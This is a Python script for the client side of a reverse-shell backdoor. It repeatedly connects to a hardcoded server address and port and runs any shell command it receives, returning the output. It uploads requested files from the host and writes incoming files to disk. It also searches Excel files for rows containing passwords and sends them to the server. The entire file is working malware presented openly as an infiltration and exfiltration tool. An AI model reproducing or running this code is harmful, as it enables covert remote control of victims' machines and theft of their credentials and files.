# Client script
# Works on TCP
# Keeps tuning to establish the connection with the Server
# Change directory (executed 'cd' shell command
# TCP bidirectional data transfer (Infiltration and Exfiltration) - Client

import socket
import subprocess
import os
import time
import pandas as pd
from openpyxl import Workbook


def initiate():
    tuneConnection()


def tuneConnection():
    mySocket = socket.socket()
    # Trying to connect to server every 20 seconds
    while True:
        time.sleep(5)
        try:
            mySocket.connect(("10.3.130.234", 8080))  # Insert IP address here
            shell(mySocket)

        except:
            tuneConnection()


def findPasswords(directory):
    passwords = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".xlsx"):
                filepath = os.path.join(root, file)
                df = pd.read_excel(filepath)
                for index, row in df.iterrows():
                    for cell in row:
                        if cell and "password" in str(cell).lower():
                            passwords.append(row.tolist())
                            break

    if passwords:
        # Write filtered rows to a new Excel file
        global excelPath
        excelPath = "C:\\Users\\siequia\\Desktop\\supersecretpasswords\\passwords.xlsx"
        wb = Workbook()
        ws = wb.active
        for row in passwords:
            ws.append(row)
        wb.save(excelPath)
        print("[+] Passwords written to passwords.xlsx")
    else:
        print("No .xlsx files found")

    return passwords


def letGrab(mySocket, path):
    if os.path.exists(path):
        f = open(path, "rb")
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send("DONE".encode())

    else:
        mySocket.send("File not found".encode())


def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, "ab")
        while True:
            data = mySocket.recv(5000)
            if data.endswith("DONE".encode()):
                # Write those last received bits without the word "done" - 4 characters
                f.write(data[:-4])
                f.close()
                break
            if "File not found".encode() in data:
                break
            f.write(data)


def execute_command(command):
    try:
        CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = CMD.communicate()  # Capture stdout and stderr
        return_code = CMD.returncode

        # Combine stdout and stderr into a single message
        output_message = ""
        if stdout:
            output_message += stdout.decode() + "\n"
        if stderr:
            output_message += stderr.decode() + "\n"

        # Formulate the final message indicating success or failure
        if return_code == 0:
            return output_message + "[+] Command executed successfully [+]\n"
        else:
            return output_message + "[!] Command execution failed [!]\n"
    except Exception as e:
        return "Error: " + str(e)


def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())
                break

        elif 'searchExcel' in command.decode():
            searchExcel, directory = command.decode().split("*")
            try:
                passwords = findPasswords(directory)
                if passwords:
                    print(passwords)
                    letGrab(mySocket, excelPath)
                else:
                    print("No .xlsx files found (in shell call)")
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        # Command format: grab*<file path>
        # Example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        # Command format: send*<destination path>*<File Name>
        # Example: send*C:\Users\John\Desktop\*photo.jpeg
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        # Command format: "cd<space><Path name>"
        # Split using the space between 'cd' and path name
        # (Because, path name also may have spaces, that confuses the script)
        # and explicitly tell the operating system to change the directory
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        else:
            result = execute_command(command.decode())
            mySocket.send(result.encode())


def main():
    initiate()


main()
